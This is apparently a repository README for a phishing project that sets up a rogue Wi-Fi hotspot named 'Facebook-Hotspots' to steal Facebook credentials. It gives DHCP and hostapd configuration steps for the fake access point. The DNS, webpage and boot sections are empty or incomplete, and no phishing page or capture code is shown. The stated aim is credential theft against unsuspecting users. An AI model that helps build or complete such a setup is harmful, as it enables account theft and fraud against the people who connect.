# Facebook-Hotspots-Phising
the Phishing project around getting facebook credentials.  USE AT OWN RISK!
the files included in this repo might (and probably will) be buggy!

## Installation of hostapd

sudo apt-get update
sudo apt-get install libssl-dev isc-dhcp-server libnl-dev

sudo nano /etc/dhcp/dhcpd.conf 
change: option domain-name "example.org"; ----> #option domain-name "example.org";
change: option domain-name-servers ns1.example.org, ns2.example.org; ----> #option domain-name-servers ns1.example.org, ns2.example.org;
change: #authoritative; ---> authoritative;

Append: 
subnet 192.168.42.0 netmask 255.255.255.0 {
	range 192.168.42.10 192.168.42.50;
    option broadcast-address 192.168.42.255;
    option routers 192.168.42.1;
    default-lease-time 600;
    max-lease-time 7200;
    option domain-name "local";
    option domain-name-servers 8.8.8.8, 8.8.4.4;
}

sudo nano /etc/default/isc-dhcp-server
change: INTERFACES="" ----> INTERFACES="wlan0" 

sudo nano /etc/network/interfaces
    iface wlan0 inet static
		address 192.168.42.1
		netmask 255.255.255.0



		
wget http://w1.fi/releases/hostapd-2.5.tar.gz
tar xzvf hostapd-2.5.tar.gz
cd hostapd-2.5/hostapd
cp defconfig .config
nano .config

change: #CONFIG_DRIVER_NL80211=y ----> CONFIG_DRIVER_NL80211=y

make
sudo make install

sudo nano hostapd.conf
	interface=wlan0
	driver=nl80211
	ssid=Facebook-Hotspots
	channel=8
	hw_mode=g


## Setup the DNS

sudo apt-get install dnsmasq
sudo nano /etc/dnsmasq.conf

## Installation of the webpages

sudo apt-get install 


## Automatic boot?
